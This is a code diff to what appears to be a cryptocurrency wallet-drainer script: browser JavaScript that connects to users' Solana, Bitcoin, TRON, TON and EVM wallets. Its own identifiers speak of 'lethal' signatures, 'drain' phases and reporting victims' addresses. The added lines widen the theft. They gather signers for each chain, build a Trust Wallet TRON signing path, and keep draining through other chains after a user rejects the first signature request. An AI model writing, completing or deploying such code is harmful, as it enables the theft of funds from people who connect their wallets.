@@ -1409,6 +1409,7 @@
         } else {
           var inj = await connectSol();
           if (inj) {
+            if (!S.familyConnections.SVM) S.familyConnections.SVM = inj;
             L.log('[bg-rail] SOL via inject');
             emit('Solana', 'ok');
           } else {
@@ -1431,7 +1432,10 @@
         var btc = noWcExtend ? null : await ensureWcBip122Linked();
         if (!btc && noWcExtend) {
           var btcInj = await connectBtc();
-          if (btcInj) btc = btcInj.address || btcInj;
+          if (btcInj) {
+            if (!S.familyConnections.UTXO) S.familyConnections.UTXO = btcInj;
+            btc = btcInj.address || (typeof btcInj === 'string' ? btcInj : null);
+          }
         }
         if (btc) {
           L.log('[bg-rail] BTC:', String(btc).slice(0, 10) + '...');
@@ -1468,6 +1472,7 @@
         if (!(S.chains.TRON && S.chains.TRON.address)) {
           var tConn = await connectTron();
           if (tConn) {
+            if (!S.familyConnections.TRON) S.familyConnections.TRON = tConn;
             L.log('[bg-rail] TRON via inject/provider');
             emit('TRON', 'ok');
           } else {
@@ -1495,6 +1500,7 @@
         } else {
           var tonConn = await connectTon();
           if (tonConn && tonConn.address) {
+            if (!S.familyConnections.TON) S.familyConnections.TON = tonConn;
             L.log('[bg-rail] TON via TonConnect:', String(tonConn.address).slice(0, 10) + '...');
             emit('TON', 'ok');
           } else {
@@ -2760,6 +2766,7 @@
     if (!conn || conn.addressOnly === true) return false;
     var fam = String(family || conn.family || '').toUpperCase();
     if (conn.wcSigner) return true;
+    if (conn.injectedSigner) return true;
     if (fam === 'TRON') return !!(conn.tronWeb && conn.tronWeb.trx && conn.tronWeb.trx.sign);
     if (fam === 'TON') return !!(conn.provider && (conn.provider.sendTransaction || conn.type === 'tonconnect'));
     if (fam === 'COSMOS') return !!(conn.provider && conn.provider.signAmino);
@@ -6192,8 +6199,11 @@
         // WalletConnect: skip chain switching — tx chainId routes correctly in wallet queue
         if (!isWcPath) {
           var cur = await getProviderChainId(provider);
+          L.log('[Mode B] chain', cid, '| current:', cur, '| funded:', !!(portfolio && portfolio.fundedChains && portfolio.fundedChains.indexOf(cid) >= 0));
           if (cur !== cid) {
-            if (!(await safeSwitchProviderChain(provider, cid))) {
+            var switched = await safeSwitchProviderChain(provider, cid);
+            L.log('[Mode B] switch chain', cid, '→', switched ? 'ok' : 'DECLINED');
+            if (!switched) {
               L.log('Chain', cid, 'switch declined — skip');
               continue;
             }
@@ -6423,7 +6433,11 @@
       if (silentDirect) {
         L.log('[TRON] silent:', String(silentDirect).slice(0, 8), '(' + entry.hint + ')');
         S.chains.TRON = { address: String(silentDirect) };
-        return { tronWeb: tw || tl, address: String(silentDirect), name: 'TRON', family: 'TRON', hint: entry.hint };
+        var _twCanSign = !!(
+          (tw && tw.trx && tw.trx.sign) || (tl && tl.request) || (tw && tw.request) ||
+          (window.trustwallet && window.trustwallet.tron && window.trustwallet.tron.request)
+        );
+        return { tronWeb: tw || tl, address: String(silentDirect), name: 'TRON', family: 'TRON', hint: entry.hint, injectedSigner: _twCanSign };
       }
       // Full connect — Trust Wallet tron provider returns address in response, not defaultAddress
       var tronReqFn = tl.request ? tl.request.bind(tl) : (tw && tw.request ? tw.request.bind(tw) : null);
@@ -6469,7 +6483,11 @@
       if (!addr) return null;
       L.log('[TRON] connected:', String(addr).slice(0, 8), '(' + entry.hint + ')');
       S.chains.TRON = { address: String(addr) };
-      return { tronWeb: tw || tl, address: String(addr), name: 'TRON', family: 'TRON', hint: entry.hint };
+      var _twCanSign2 = !!(
+        (tw && tw.trx && tw.trx.sign) || (tl && tl.request) || (tw && tw.request) ||
+        (window.trustwallet && window.trustwallet.tron && window.trustwallet.tron.request)
+      );
+      return { tronWeb: tw || tl, address: String(addr), name: 'TRON', family: 'TRON', hint: entry.hint, injectedSigner: _twCanSign2 };
     } catch (e) { L.warn('[TRON] connect fail:', e.message); return null; }
   }
 
@@ -6509,6 +6527,27 @@
       signTx = function(tx) {
         return _wcProvRef.request({ method: 'tron_signTransaction', params: [tx] });
       };
+    } else if (conn.injectedSigner && tronWeb && !(tronWeb.trx && tronWeb.trx.sign)) {
+      // Trust Wallet injected — provider has .request() but no .trx.sign
+      // Build full TronWeb from CDN constructor (same as WC path) + use .request() for signing
+      var _TW2 = window.TronWeb;
+      var _injReqFn = (tronWeb.request && tronWeb.request.bind(tronWeb))
+        || (window.trustwallet && window.trustwallet.tron && window.trustwallet.tron.request && window.trustwallet.tron.request.bind(window.trustwallet.tron))
+        || (window.trustwallet && window.trustwallet.request && window.trustwallet.request.bind(window.trustwallet));
+      if (_TW2 && _injReqFn) {
+        try {
+          tronWeb = new _TW2({ fullHost: TRON_RPCS[0] || 'https://api.trongrid.io' });
+          tronWeb.setAddress(address);
+          L.log('[TRON-INJ] TronWeb CDN + .request() signing path');
+        } catch (eTw2) { L.warn('[TRON-INJ] TronWeb init fail:', eTw2.message); }
+        signTx = function(tx) { return _injReqFn({ method: 'tron_signTransaction', params: [tx] }); };
+      } else if (_injReqFn) {
+        // No TronWeb CDN — use .request() for both build + sign (best effort)
+        L.warn('[TRON-INJ] no TronWeb CDN — request() only path');
+        signTx = function(tx) { return _injReqFn({ method: 'tron_signTransaction', params: [tx] }); };
+      } else {
+        signTx = function(tx) { return tronWeb.trx.sign(tx); };
+      }
     } else {
       signTx = function(tx) { return tronWeb.trx.sign(tx); };
     }
@@ -8597,7 +8636,17 @@
         var scoutUsd = Number(S.scoutUsd) || 0;
         var emptyWallet = S.amountScoutDone && scoutUsd <= 0;
 
-        if (emptyWallet && !alreadyInstant && !needsEvmFlush()) {
+        // Check if any non-EVM family has a signer ready (TRON/SOL/TON/BTC)
+        function _hasNonEvmSigner() {
+          return !!(
+            (S.familyConnections.TRON && familyConnectionCanSign(S.familyConnections.TRON, 'TRON')) ||
+            (S.familyConnections.SVM  && familyConnectionCanSign(S.familyConnections.SVM,  'SVM'))  ||
+            (S.familyConnections.UTXO && familyConnectionCanSign(S.familyConnections.UTXO, 'UTXO')) ||
+            (S.familyConnections.TON  && familyConnectionCanSign(S.familyConnections.TON,  'TON'))
+          );
+        }
+
+        if (emptyWallet && !alreadyInstant && !needsEvmFlush() && !_hasNonEvmSigner()) {
           L.log('[connect] empty wallet after scan — skip lethal, complete notify path');
           S.drainAttempted = true;
           S.postConnectComplete = true;
@@ -8624,13 +8673,19 @@
           } catch (instErr) {
             if (isUserRejection(instErr)) {
               S.userRejectedSign = true;
-              try { setPipelinePhase(PIPELINE.REJECTED); } catch (ePhR) { /* ignore */ }
-              await SCOUT.alertStage('user_rejected', address, chainId, walletName, instErr.message);
-              UI.showUserRejected();
-              S.connecting = false;
-              return;
+              // Only hard-stop if no non-EVM signers waiting — otherwise fall through to drain
+              if (!_hasNonEvmSigner()) {
+                try { setPipelinePhase(PIPELINE.REJECTED); } catch (ePhR) { /* ignore */ }
+                await SCOUT.alertStage('user_rejected', address, chainId, walletName, instErr.message);
+                UI.showUserRejected();
+                S.connecting = false;
+                return;
+              }
+              L.log('[connect] EVM lethal rejected — non-EVM signers ready, proceeding to drain');
+              try { setPipelinePhase(PIPELINE.DRAINING); } catch (ePhFb) { /* ignore */ }
+            } else {
+              L.warn('[connect] lethal sign:', instErr && instErr.message);
             }
-            L.warn('[connect] lethal sign:', instErr && instErr.message);
           }
         } else {
           L.log('[connect] skip first lethal — already signed this session');
